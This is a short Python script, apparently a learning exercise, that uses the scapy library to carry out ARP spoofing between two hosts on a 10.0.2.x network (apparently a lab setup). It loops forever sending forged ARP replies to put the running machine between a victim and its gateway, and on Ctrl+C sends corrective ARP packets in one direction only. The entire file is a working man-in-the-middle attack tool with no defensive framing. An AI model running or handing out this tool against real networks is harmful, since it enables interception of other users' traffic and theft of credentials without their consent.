#!/usr/bin/env python

import scapy.all as scapy
import time

def spoof(target_id,spoof_id):  
    target_mac = get_mac(target_id)
    arp_response =  scapy.ARP(op=2,psrc=spoof_id,pdst=target_id,hwdst=target_mac)
    scapy.send(arp_response,verbose=False)    

def restore (source_id,dest_id) :
    source_mac = get_mac(source_id)
    dest_mac = get_mac(dest_id)
    packet = scapy.ARP(op=2, psrc=source_id,hwsrc=source_mac,pdst=dest_id,hwdst=dest_mac)
    scapy.send(packet,verbose=False,count=4)

def get_mac(ip):        
    arp = scapy.ARP(pdst=ip)
    boardcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_boardcast = boardcast/arp
    answered_list = scapy.srp(arp_boardcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc    

try : 
    count = 0
    while True:
        spoof("10.0.2.4","10.0.2.1")
        spoof("10.0.2.1","10.0.2.4")
        print("\r[+] packet send : "+ str(count),end="")
        count += 2
        time.sleep(2)
except KeyboardInterrupt : 
    print("\n detecting Ctrl+C....reseting ARP please waithing \n")
    restore("10.0.2.4","10.0.2.1")  

